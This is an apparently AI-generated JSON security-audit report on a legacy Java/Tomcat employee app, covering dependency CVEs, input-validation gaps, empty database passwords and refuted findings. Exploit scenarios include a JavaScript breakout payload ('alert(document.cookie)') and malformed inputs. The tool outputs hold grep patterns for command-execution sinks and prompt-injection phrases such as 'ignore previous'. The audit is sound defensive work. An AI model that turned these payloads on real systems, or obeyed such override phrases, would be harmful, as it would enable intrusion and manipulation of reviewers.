+   "exploitScenario": "If any JSP adds an <x:parse>/<x:transform> or <c:import> of attacker-influenced XML, the bundled 2006 org.apache.taglibs.standard.tag.common.xml classes process external entities and XSLT extensions, so an attacker can read local files (e.g. Tomcat conf/context.xml with DB credentials) or run code. Today only the core taglib's <c:out> is used, which lowers exploitability.",
+   "recommendedFix": "Replace webapp/WEB-INF/lib/jstl-1.2.jar (installed 1.2, SHA-1 74aca283...) with org.apache.taglibs:taglibs-standard-impl 1.2.5 + taglibs-standard-spec 1.2.5 (fixed in 1.2.3+). For Tomcat 10+/Jakarta, use org.glassfish.web:jakarta.servlet.jsp.jstl 3.0.1 or later. Manage the version in a real dependency manifest (Maven/Gradle or Ivy) so SCA tools can track it.",
+   "maskedEvidence": "jstl-1.2.jar MANIFEST: Implementation-Version: 1.2, Implementation-Title: Sun Java System Application Server; contains org/apache/taglibs/standard/tag/common/xml/* and ImportSupport.class dated 07-20-2006",
+   "severityNote": "The vulnerable dependency is real, but nothing in the app can reach the vulnerable code today, so I'm lowering the severity from Medium to Low.\n\nWhat I confirmed:\n- The jar at legacy/employee-app/webapp/WEB-INF/lib/jstl-1.2.jar has a manifest that says Implementation-Version 1.2 and Implementation-Title Sun Java System Application Server, built with Ant 1.6.5 and JDK 1.5.0_06.\n- It contains org/apache/taglibs/standard/tag/common/xml/* and core/ImportSupport.class, all dated 07-20-2006. That is the 2006 Standard Taglib code, older than the 1.2.3 fix for CVE-2015-0254.\n- The `war` target in build.xml packages every jar in WEB-INF/lib into the WAR, so this jar ships in production.\n\nWhy it isn't exploitable now:\n- CVE-2015-0254 is only reachable through the <x:parse>, <x:transform> or <c:import> tags, and only when they process XML or a URL an attacker can influence.\n- I grepped webapp/ and src/. The only taglib directive is the core taglib at webapp/Welcome.jsp:2. No x: tags appear, and neither does c:import.\n- An attacker can't add a JSP to a deployed app, so exploiting this would need a developer to change the code first.\n\nSo this is a real \"uses a component with a known vulnerability\" finding (CWE-1395), but there is no attack path in the code as it stands. Low fits a dormant risk that would become live after a future edit, and Medium overstates it.\n\nFix: replace the jar with org.glassfish.web:jakarta.servlet.jsp.jstl or org.apache.taglibs:taglibs-standard-impl 1.2.5 or later (the 1.2.3+ fix). Also avoid the x: and c:import tags with untrusted input. I found no instruction-shaped text aimed at automated analysis in the files I inspected."
+  },
+  {
+   "title": "PostgreSQL JDBC driver 42.7.4 affected by CVE-2025-49146 (channelBinding=require silently falls back to non-channel-bound auth)",
+   "cwe": "CWE-287",
+   "severity": "Low",
+   "source": "legacy/employee-app/lib/provided/postgresql-42.7.4.jar (referenced at legacy/employee-app/webapp/META-INF/context.xml:5 and :9-10)",
+   "exploitScenario": "If an operator hardens the JNDI URL with channelBinding=require, a man-in-the-middle between Tomcat and PostgreSQL can still force a weaker auth method (e.g. cleartext/MD5) that the 42.7.4 driver accepts instead of failing closed. The URL at context.xml:10 does not set sslmode or channelBinding at all, so the connection is already plaintext and MITM-able regardless.",
+   "recommendedFix": "Upgrade to org.postgresql:postgresql 42.7.7 or later (installed 42.7.4, fixed 42.7.7; current 42.7.x preferred) and update the jar in Tomcat's lib/. Also add sslmode=verify-full (and channelBinding=require on the fixed driver) to the JDBC URL in context.xml:10.",
+   "maskedEvidence": "postgresql-42.7.4.jar MANIFEST: Implementation-Title: PostgreSQL JDBC Driver, Implementation-Version: 42.7.4; context.xml:10 url=\"jdbc:postgresql://localhost:5432/employee\""
+  },
+  {
+   "cwe": "CWE-1284",
+   "severity": "Low",
+   "source": "servlet/AddEmployeeServlet.java:44",
+   "title": "Add salary check (< 0) is bypassed by NaN and Infinity",
+   "exploitScenario": "An attacker submits salary=NaN or salary=Infinity. Double.parseDouble accepts both, 'NaN < 0' is false so the check at line 49 passes, and PostgreSQL DOUBLE PRECISION stores the non-finite value, which breaks any later salary totals or reports.",
+   "recommendedFix": "After parsing, reject when Double.isNaN(v) || Double.isInfinite(v) || v < 0 || v > MAX_SALARY. Better still, use BigDecimal with an upper bound and a NUMERIC(12,2) column with a CHECK constraint.",
+   "maskedEvidence": "employeeSalary = Double.parseDouble(salary.trim()); ... if (employeeSalary < 0) {",
+   "severityNote": "The finding is real. In /Users/arun/Documents/Projects/Code-Modernisation/Employee_Managment_App/legacy/employee-app/servlet/AddEmployeeServlet.java:44, `Double.parseDouble(salary.trim())` accepts \"NaN\", \"Infinity\" and \"-NaN\". The only check after it is `employeeSalary < 0` at line 49. That check is false for NaN and for +Infinity, so both values get through. Nothing upstream stops them either. The `min=\"0\"` and `type=\"number\"` attributes in /Users/arun/Documents/Projects/Code-Modernisation/Employee_Managment_App/legacy/employee-app/webapp/addEmployee.jsp:29 only run in the browser, so a crafted POST skips them. The insert in /Users/arun/Documents/Projects/Code-Modernisation/Employee_Managment_App/legacy/employee-app/dao/EmployeeDAO.java:27 binds the value with `ps.setDouble`, and pgjdbc sends NaN and Infinity as valid float8 values. The column is defined at /Users/arun/Documents/Projects/Code-Modernisation/Employee_Managment_App/legacy/employee-app/schema.sql:14 as `salary DOUBLE PRECISION NOT NULL` with no CHECK constraint, so PostgreSQL stores the value. showEmployee.jsp then shows it as \"NaN\" or \"Infinity\", and any SUM or AVG over the column is corrupted.\n\nI'm lowering the severity to Low. The damage is limited to data integrity: a user who can already add employee records can store a bad value. It gives no injection, information disclosure or privilege gain.\n\nFix: after parsing, reject non-finite values with `if (!Double.isFinite(employeeSalary) || employeeSalary < 0)`, and add an upper bound. Also add `CHECK (salary >= 0 AND salary < 'Infinity')` to the schema. PostgreSQL sorts NaN above every other value, so this constraint rejects NaN as well. The salary branch of the update path (EmployeeDAO.java:42-43) should get the same validation."
+  },
+  {
+   "cwe": "CWE-248",
+   "severity": "Low",
+   "source": "servlet/DeleteEmployeeServlet.java:27",
+   "title": "Unguarded Integer.parseInt on id causes an uncaught exception and a default Tomcat stack-trace page",
+   "exploitScenario": "An attacker POSTs id=abc to /DeleteEmployeeServlet. The NumberFormatException is uncaught, and because the WAR has no web.xml error-page, Tomcat's default 500 page shows the stack trace and server version, which helps reconnaissance.",
+   "recommendedFix": "Wrap the parse in try/catch(NumberFormatException) and return a fixed error, or use a shared parsePositiveInt helper. Also add a global <error-page> for java.lang.Throwable and set ErrorReportValve showReport=false and showServerInfo=false in Tomcat.",
+   "maskedEvidence": "boolean deleted = employeeDAO.deleteEmployee(Integer.parseInt(id), name);"
+  },
+  {
+   "cwe": "CWE-248",
+   "severity": "Low",
+   "source": "servlet/EditEmployeeServlet.java:29",
+   "title": "Unguarded Integer.parseInt on id in the Edit servlet (uncaught exception and stack trace)",
+   "exploitScenario": "An attacker POSTs id=1e9999 to /EditEmployeeServlet and gets an unhandled NumberFormatException rendered as Tomcat's verbose 500 page.",
+   "recommendedFix": "Validate id with try/catch, require it to be positive, and return a generic error. Add a global error page.",
+   "maskedEvidence": "employeeDao.updateEmployee(Integer.parseInt(id), field, newValue);"
+  },
+  {
+   "cwe": "CWE-248",
+   "severity": "Low",
+   "source": "servlet/LoginServlet.java:22",
+   "title": "LoginServlet parses id with no null or format check (unauthenticated crash and stack trace)",
+   "exploitScenario": "Without logging in, an attacker POSTs to /LoginServlet with no id or a non-numeric id. Integer.parseInt(null) or parseInt('x') throws an uncaught exception, and the default error page reveals stack and server details.",
+   "recommendedFix": "Null-check and try/catch the id parse and return the generic 'Incorrect name or id' response. Also null-check and trim name the same way signup does, so login and signup normalize input identically.",
+   "maskedEvidence": "int id = Integer.parseInt(request.getParameter(\"id\"));"
+  },
+  {
+   "cwe": "CWE-20",
+   "severity": "Low",
+   "source": "servlet/SignUpServlet.java:35",
+   "title": "Signup does not validate admin name (null, blank or oversized) or id range before persisting",
+   "exploitScenario": "An attacker POSTs id=-5&name= (or leaves name out) straight to /SignupServlet, skipping the HTML 'required' and 'min=1' attributes. That creates admin_data rows with blank or NULL names and negative ids, and names over 255 characters produce DB errors instead of a clean rejection.",
+   "recommendedFix": "On the server, require a non-blank name, enforce a length limit (1 to 100) and an allow-list pattern such as ^[\\p{L} .'-]+$, and require id > 0 before calling AdminDAO.saveAdmin. Add NOT NULL and CHECK constraints in schema.sql.",
+   "maskedEvidence": "admin.setName(name == null ? null : name.trim()); AdminDAO.saveAdmin(admin);"
+  },
+  {
+   "cwe": "CWE-20",
+   "severity": "Low",
+   "source": "servlet/AddEmployeeServlet.java:56",
+   "title": "No length or character validation on employee name and department before persistence",
+   "exploitScenario": "An attacker submits a name or department containing HTML/JS markup or over 255 characters. Markup is stored verbatim (and later output without encoding, see the next finding), and oversized values cause DB errors instead of a clean validation message.",
+   "recommendedFix": "Enforce max lengths that match schema.sql (255) and allow-list character classes for name and department, or validate department against a fixed list of known departments. Apply the same validator to newValue in EditEmployeeServlet when field=department.",
+   "maskedEvidence": "employee.setName(name.trim()); ... employee.setDepartment(department.trim());"
+  },
+  {
+   "cwe": "CWE-20",
+   "severity": "Low",
+   "source": "servlet/EditEmployeeServlet.java:23",
+   "title": "The 'name' parameter is required but never checked; the update is keyed on id only (behavior differs from code docs and README)",
+   "exploitScenario": "An attacker who knows or enumerates sequential employee ids can change any employee's salary or department by sending any value for name, because the form's id+name check (unlike delete) is never passed to updateEmployee. README.md:119 documents an updateEmployee(id, name, field, newValue) signature that does not exist in the code.",
+   "recommendedFix": "Pass name to EmployeeDAO.updateEmployee and add 'AND name = ?' to the WHERE clause, matching deleteEmployee. Better, look up the record by id and confirm it exists and that the caller is authorized before updating. Update README to match the actual behavior.",
+   "maskedEvidence": "String name = request.getParameter(\"name\"); ... updateEmployee(Integer.parseInt(id), field, newValue)"
+  }
+ ],
+ "refuted": [
+  {
+   "cwe": "CWE-79",
+   "severity": "Low",
+   "source": "legacy/employee-app/servlet/AddEmployeeServlet.java:81",
+   "title": "Unsafe pattern: alert message is concatenated into an inline <script> block (not currently exploitable)",
+   "exploitScenario": "No exploit exists today because every message is a constant. But if a future change passes user input, such as the submitted name or e.getMessage() from the SQLException, into showAlert, a value like ');alert(document.cookie);(' would break out of the JavaScript string and run as script. The same pattern is at SignUpServlet.java:47.",
+   "recommendedFix": "Stop writing raw <script> blocks from servlets. Store the message in the request or session and show it in the JSP with <c:out>. If inline JS has to stay, encode the message with OWASP Encoder Encode.forJavaScript(message) and set Content-Type: text/html; charset=UTF-8.",
+   "maskedEvidence": "response.getWriter().println(\"<script>alert('\" + message + \"'); window.location.href='addEmployee.jsp';</script>\");",
+   "refutationReason": "Not exploitable, so this is not a real CWE-79 finding. AddEmployeeServlet.java:81 does concatenate `message` into an inline <script>alert('...'), but every call to showAlert (lines 30, 38, 46, 50, 66-68) passes a fixed string. The SQLException branch only picks between two fixed strings based on getSQLState(), and never uses e.getMessage() or any request parameter (name, id, salary, department). SignUpServlet.java:47 is the same: `message` is one of two fixed strings chosen by SQLState, and the request's name and id never reach the output. No attacker-controlled data reaches the sink, and the finder admits no exploit exists today. The finding depends on a guess about future code changes, so it is at most a hardening or code-quality note (escape `message` for JavaScript or move the alert to the JSP), not a vulnerability."
+  },
+  {
+   "title": "Raw exception stack traces with DB error details written to server stdout/catalina.out",
+   "cwe": "CWE-532",
+   "severity": "Low",
+   "source": "legacy/employee-app/servlet/AddEmployeeServlet.java:64",
+   "exploitScenario": "PostgreSQL SQLException messages include DETAIL text such as 'Key (id)=(...) already exists' or the failing row's values (name, department, salary). e.printStackTrace() dumps them unredacted into catalina.out, so anyone with log access (operators, log shipping, support bundles) can collect employee PII and admin IDs. The same pattern appears at SignUpServlet.java:42, AdminDAO.java:41,62, EmployeeDAO.java:56,75,97,118 and DBUtil.java:20.",
+   "recommendedFix": "Use a logging framework (SLF4J/JUL) instead of printStackTrace. Log the SQLState and a correlation ID at WARN level, without e.getMessage() or row data, and keep full stack traces at DEBUG level with restricted log file permissions.",
+   "maskedEvidence": "} catch (SQLException e) { e.printStackTrace(); ...",
+   "isCredential": false,
+   "refutationReason": "The finding claims that `e.printStackTrace()` in `legacy/employee-app/servlet/AddEmployeeServlet.java:64` (and similar sites) writes employee personal data (name, department, salary) into catalina.out. The code and schema do not support that.\n\n1. **The \"failing row\" detail can't be triggered.** PostgreSQL only puts a row's values in an error message for not-null, check or exclusion violations. In `legacy/employee-app/schema.sql`:\n   - `employee_data` has no CHECK constraints.\n   - Its only NOT NULL column is `salary`, and the servlet always sets it after parsing it and rejecting negatives.\n   - `name` and `department` are allowed to be null, and the servlet rejects blank values anyway.\n\n2. **The errors that can happen don't include personal data.**\n   - A duplicate primary key (23505) only reports `Key (id)=(N) already exists`, which is a number the user just typed in.\n   - A value longer than 255 characters only reports `value too long for type character varying(255)`, with no values.\n   - Connection failures don't include row data.\n\n3. **The pattern exists, but the output is harmless.**\n   - In `SignUpServlet.java:42`, a duplicate-key error only shows the admin ID.\n   - In `AdminDAO.java:41` and `AdminDAO.java:62`, the queries are SELECTs that bind parameters, so their errors are about connection or SQL problems, not row values.\n   - `DBUtil.java:20` doesn't call `printStackTrace` at all. It prints a NamingException when the DataSource lookup fails, which contains no personal or secret data.\n\n4. **The users don't see the stack traces.** The servlets show them fixed alert messages, so nothing leaks to the browser.\n\nWriting server-side exception traces to the container log is normal operational logging. The worst case here is an employee or admin ID in a log that only operators can read, and an ID on its own is not a credential. Replacing `printStackTrace` with a proper logger is a reasonable cleanup, but the CWE-532 claim that personal data reaches the logs doesn't hold."
+  },
+  {
+   "title": "No dependency manifest: vendored jars and unpinned runtime container cannot be tracked by SCA tooling",
+   "cwe": "CWE-1104",
+   "severity": "Low",
+   "source": "legacy/employee-app/build.xml:11",
+   "exploitScenario": "Because dependencies are hand-copied jars (build.xml:14-22) and the servlet container is whatever Homebrew tomcat@9 is installed at build.xml:11 (currently 9.0.123 on this host, which is not affected by known CVEs), a future vulnerable jar or a stale Tomcat on another host would not be caught by npm/pip/Maven-style audits. That leaves an attacker free to use a public Tomcat or driver CVE until someone notices by hand.",
+   "recommendedFix": "Move to Maven/Gradle (or Ant+Ivy) with explicit pinned coordinates and checksums. Run OWASP dependency-check or osv-scanner in CI, and pin and document the minimum Tomcat 9.0.x patch level in deployment docs and checks. javax.servlet-api 4.0.1 is compile-only (provided scope) and has no known CVEs, so it needs no change.",
+   "maskedEvidence": "<property name=\"tomcat.home\" value=\"/opt/homebrew/opt/tomcat@9/libexec\"/>; <fileset dir=\"lib/provided\" includes=\"*.jar\"/>",
+   "refutationReason": "This is a process observation, not a vulnerability, and its main claim is wrong. The facts it cites are accurate: there is no Maven/Gradle/Ivy manifest. legacy/employee-app/build.xml:11 sets tomcat.home to the Homebrew tomcat@9 path, and lines 14-22 compile against jars that were copied into the repo by hand. Those jars are lib/provided/javax.servlet-api-4.0.1.jar, lib/provided/postgresql-42.7.4.jar and webapp/WEB-INF/lib/jstl-1.2.jar.\n\n1. The headline claim that these jars \"cannot be tracked by SCA tooling\" is false. Every jar carries its version in its filename and its own metadata. Jar-scanning tools such as OWASP Dependency-Check, Trivy, Grype and Syft fingerprint jars like these without a manifest, so the Tomcat or driver CVE described would still show up in a scan.\n\n2. Nothing vulnerable is in use today. PostgreSQL JDBC 42.7.4 is newer than the fix for CVE-2024-1597 (fixed in 42.7.2). The servlet API jar is only used to compile and is not shipped in the WAR. The installed Tomcat reports version 9.0.123, and the finder agrees it has no known CVEs.\n\n3. tomcat.home is only a default build path; it can be overridden with -Dtomcat.home=..., as the comment at line 10 says. The runtime container belongs to the deployment environment, not to the app's pinned dependencies. A stale Tomcat on some other host is a server-patching issue.\n\n4. The exploit scenario only works if a vulnerable version appears later and nobody runs any scan. That is a \"what if\", not an attack path in this code.\n\n5. CWE-1104 means using components that are no longer maintained, and none of these jars fit that.\n\nAdding a dependency manifest or SBOM is still a sensible modernization step, but it is a recommendation, not a security finding."
+  }
+ ],
+ "unverified": [],
+ "deadFinders": [],
+ "credentialFindings": [
+  {
+   "cwe": "CWE-521",
+   "severity": "Medium",
+   "source": "legacy/employee-app/webapp/META-INF/context.xml:12",
+   "title": "Database pool configured with an empty password for role employee_app",
+   "exploitScenario": "If PostgreSQL trusts local or loopback logins (README step 2 creates the role with LOGIN and no password), any local process or SSRF-adjacent attacker connects as employee_app, which also owns the database, and reads or alters admin_data and employee_data directly, bypassing the app.",
+   "recommendedFix": "Give employee_app a strong password injected from the environment or a secrets manager (not committed). Require scram-sha-256 in pg_hba.conf. Make the app role a non-owner with least-privilege DML grants.",
+   "isCredential": true,
+   "credentialMeta": {
+    "credentialType": "PostgreSQL DB password (empty)",
+    "grantsAccessTo": "PostgreSQL database 'employee' on localhost:5432 as role employee_app (database owner per README)",
+    "maskedPreview": "password=\"\" (empty, no secret value present)",
+    "prodOrTest": "Appears to be dev/local config, but it is the only deployment config shipped",
+    "rotationRecommendation": "Set a strong password and enforce password auth; no existing secret value needs rotating"
+   },
+   "maskedEvidence": "username=\"employee_app\" password=\"\""
+  },
+  {
+   "title": "DB connection credentials hardcoded in a tracked, WAR-packaged context.xml; empty password implies a passwordless/trust-auth DB role",
+   "cwe": "CWE-798",
+   "severity": "Low",
+   "source": "legacy/employee-app/webapp/META-INF/context.xml:11",
+   "exploitScenario": "The DB login (employee_app) sits in source control with an empty password. README.md:77 creates the role with no password, so the database relies on pg_hba trust. Anyone who can reach PostgreSQL from a trusted host can log in as the app role and read or modify all employee and admin data. Also, README.md:82 tells operators to type the real password into this tracked file, which gets committed and packaged into the WAR (build.xml:44).",
+   "recommendedFix": "Take username and password out of webapp/META-INF/context.xml. Define the Resource in Tomcat's conf/context.xml or conf/Catalina/localhost/<app>.xml, outside the repo, and read the values from environment or system properties (${db.password} with org.apache.tomcat.util.digester.EnvironmentPropertySource). Create the role WITH PASSWORD and use scram-sha-256 in pg_hba.conf. Add a gitignore or pre-commit secret scan for context.xml overrides.",
+   "maskedEvidence": "username=\"em****\" password=\"\" (empty)",
+   "isCredential": true,
+   "credentialMeta": {
+    "credentialType": "PostgreSQL JDBC username with empty password",
+    "grantsAccessTo": "PostgreSQL database 'employee' on localhost:5432 (admin_data, employee_data tables) as owner role employee_app",
+    "maskedPreview": "username=em**** / password=<empty>",
+    "prodOrTest": "Appears to be a local/dev configuration (localhost); no live secret value present",
+    "rotationRecommendation": "No secret value to rotate. Set a strong password on the employee_app role, turn off trust auth, and keep the password out of source control from now on. Git history (Hibernate cfg in commit fd8d014 and earlier) has only empty or placeholder passwords, so nothing in history needs rotation."
+   },
+   "severityNote": "I confirmed the cited lines, but the finding is overstated. At legacy/employee-app/webapp/META-INF/context.xml:11-12 the username is \"em****\" and password=\"\" is empty. The URL on line 10 is jdbc:postgresql://localhost:5432/employee.\n\nWhat does not hold up:\n- No secret value is hardcoded or leaked. A role name is not a credential, and an empty password string reveals nothing. So \"CWE-798 Use of Hard-coded Credentials\" in the sense of an exposed secret that needs rotation does not apply.\n- Shipping context.xml inside the WAR is normal Tomcat practice. build.xml:44 packages webapp/**, so the claim about packaging is accurate, but nothing secret is in it today.\n\nWhat is real, as a configuration and design weakness:\n- README.md tells operators to create the role with CREATE ROLE employee_app LOGIN and no password. It then connects over TCP with an empty password. That only works if pg_hba.conf trusts localhost connections. So the documented deployment depends on a database role that has full ownership of the employee database (OWNER employee_app) and no password. Any local user or process on the DB host, or anything that can reach the trusted address, can connect as the app role and read or modify all employee and admin data.\n- The README also tells operators to type the real password into this tracked file. That invites committing a live password later. It is a latent risk, not a present leak.\n\nWhy Low: the exposure is limited to local or trusted hosts, which by definition already sit inside the trust boundary. It depends on the operator's pg_hba setup, and there is no remotely exploitable path in the code. The more accurate CWEs are CWE-521/CWE-1188 (passwordless role, insecure default) plus CWE-260 (password kept in a tracked config file).\n\nFix:\n- Give the role a strong password: CREATE ROLE ... LOGIN PASSWORD.\n- Require scram-sha-256 in pg_hba.conf.\n- Keep the real credentials out of the tracked file. Supply the Resource from Tomcat's conf/Catalina/localhost/<app>.xml, or resolve it from environment or system properties (${db.password}).\n- Add a gitignored context.xml template."
+  }
+ ],
+ "toolOutputs": [
+  "I read every SQL statement and found no SQL injection: all of them use PreparedStatement with bound parameters. Files checked: legacy/employee-app/dao/AdminDAO.java:21,32,48 and legacy/employee-app/dao/EmployeeDAO.java:21,43,46,68,85,109. The column choice in updateEmployee (EmployeeDAO.java:42-49) uses a fixed allow-list, so the field parameter cannot reach the SQL text. Login.jsp:84 calls AdminDAO.validateAdmin, which is parameterized.\n\nGrep for OS command, LDAP, XPath and script-engine sinks returned no matches. Pattern: Runtime, ProcessBuilder, .exec(, createStatement, addBatch, InitialDirContext, XPath, ScriptEngine, eval(. Searched **/*.java, **/*.jsp, **/*.xml.\n\nGrep for string concatenation in Java/JSP/XML matched 3 lines:\nservlet/SignUpServlet.java:47:            response.getWriter().println(\"<script>alert('\" + message + \"'); window.location='signup.jsp';</script>\");\nservlet/AddEmployeeServlet.java:81:        response.getWriter().println(\"<script>alert('\" + message + \"'); window.location.href='addEmployee.jsp';</script>\");\nutil/DBUtil.java:20:            System.err.println(\"DataSource lookup failed.\" + ex);\n\nThe two servlet matches only concatenate fixed messages, so they are reported as Low latent findings.\n\nTemplate injection: none found. The JSPs do not evaluate user input as JSP or EL code. Welcome.jsp:53 uses <c:out>, which is safe. showEmployee.jsp:33-34 prints database values with <%= %> and no escaping, which is the stored XSS finding.\n\nNo dependency audit was run: there is no npm or pip manifest. The jars are postgresql-42.7.4, javax.servlet-api-4.0.1 and jstl-1.2.\n\nCredentials: none found. context.xml:12 has an empty password, which is a configuration issue and outside this injection audit.\n\nPrompt injection: no text in the audited files is addressed to AI tools or reviewers. Searched for SYSTEM:, \"ignore previous\", \"false positive\" and \"reviewer\".\n\nOutside injection scope, for other passes:\n- AddEmployeeServlet, EditEmployeeServlet, DeleteEmployeeServlet and ShowEmployeeServlet do not check that the user is logged in. EditEmployeeServlet also ignores the name parameter.\n- LoginServlet.java:22 and DeleteEmployeeServlet.java:27 return an HTTP 500 on non-numeric input (uncaught NumberFormatException).\n- Admin sign-up is open to anyone, and the login check only compares id and name; there is no password.",
+  "No dependency SAST applies: Ant/Java with no npm/pip manifests, and only webapp/WEB-INF/lib/jstl-1.2.jar is bundled. Read-only greps: no `invalidate|setMaxInactive|HttpOnly|Secure|Filter` hits in source (only CSS backdrop-filter). `password` hits: README.md:86 placeholder 'your_password', webapp/META-INF/context.xml:12 empty value. There is no web.xml under webapp/WEB-INF. No instruction-shaped or AI-directed text found in the files reviewed.",
+  "There is no npm or pip manifest; this is a Java 8 servlet/JSP app built with Ant, using PostgreSQL and Tomcat 9. I ran grep for password, secret, token, API key and jdbc: patterns across legacy/employee-app (*.jar excluded). Matches: README.md:84 (jdbc:postgresql://localhost:5432/employee), README.md:86 (password=\\\"yo****\\\", a documentation placeholder), webapp/META-INF/context.xml:10 (JDBC URL), context.xml:12 (password=\\\"\\\", empty). I ran git log -p -S password across all commits. The only matches are the old Hibernate/MySQL configs (connection.password empty or the placeholder \\\"yo****\\\") and context.xml with an empty password. No live credential value was found in the tree or in history. Since no secret value exists, none appears in this report. The NetBeans template comments ('Click nbfs://...') in the servlets are normal IDE boilerplate. I found no text aimed at manipulating AI or reviewers.",
+  "The stack is Java 8 Servlet/JSP on Tomcat 9, built with Ant. There are no npm, pip or Maven/Gradle manifests, so npm audit and pip-audit don't apply. dependency-check, trivy, grype and osv-scanner are not installed (`which` returned \"not found\" for all four). Instead I identified the jars by hand from their META-INF/MANIFEST.MF files and SHA-1 hashes, then matched them to known CVEs.\n\n| Jar | Version | SHA-1 | Known CVE | Fixed in |\n|---|---|---|---|---|\n| lib/provided/javax.servlet-api-4.0.1.jar | 4.0.1 | a27082684a2ff0bf397666c3943496c44541d1ca | none (compile-only API) | \u2014 |\n| lib/provided/postgresql-42.7.4.jar | 42.7.4 | 264310fd7b2cd76738787dc0b9f7ea2e3b11adc1 | CVE-2025-49146 | 42.7.7 |\n| webapp/WEB-INF/lib/jstl-1.2.jar | 1.2 (2006 Sun/Glassfish build, contains org.apache.taglibs.standard classes) | 74aca283cd4f4b4f3e425f5820cda58f44409547 | CVE-2015-0254 | taglibs-standard 1.2.3+ |\n\nRuntime container: /opt/homebrew/opt/tomcat@9 points to Cellar/tomcat@9/9.0.123 (ServerInfo.properties says Apache Tomcat/9.0.123, built 2026-10-06). It has no known unpatched CVEs, but build.xml doesn't pin it. JSTL usage is limited to the core taglib (`<c:out>` at Welcome.jsp:53); no x: or sql: tags are used. No credentials were found in the files in scope (context.xml:12 has an empty password, outside this class). No instruction-shaped text was found.",
+  "Stack: Java 8 Servlets/JSP on Tomcat 9 with PostgreSQL via JNDI pool, built with Ant. There is no npm or pip manifest, so npm audit and pip-audit do not apply. lib/provided is gitignored and missing, so there are no jars to scan. Grep for deserialization and file-handling sinks (ObjectInputStream, readObject, XMLDecoder, yaml, new File(, Paths., getRealPath, getPart/multipart, jsp:include, getResource, Runtime/ProcessBuilder) found no matches in Java or JSP sources. Result: no insecure deserialization, path traversal, file upload or unsafe file-handling sinks exist in legacy/employee-app. Session attributes hold only Strings, and build.xml copy/deploy paths are not attacker-controlled. All SQL uses PreparedStatement with bound parameters (dao/*.java), and the column name in the update is chosen from a fixed allow-list. Grep for instruction-shaped text (SYSTEM:, ignore previous, false positive, text aimed at AI/reviewers) found none. Out of scope for this class but seen: webapp/META-INF/context.xml:12 has an empty DB password (not a secret value, so nothing to mask); servlets do no authentication checks; signup is open; no CSRF tokens."
+ ],
+ "injectionFlags": [],
+ "stats": {
+  "bySeverity": {
+   "Critical": 1,
+   "High": 10,
+   "Medium": 7,
+   "Low": 17
+  },
+  "falsePositiveRate": "8%",
+  "finders": 5,
+  "deadFinders": [],
+  "distinctFindings": 38,
+  "judged": 38,
+  "unverified": 0
+ }
+}
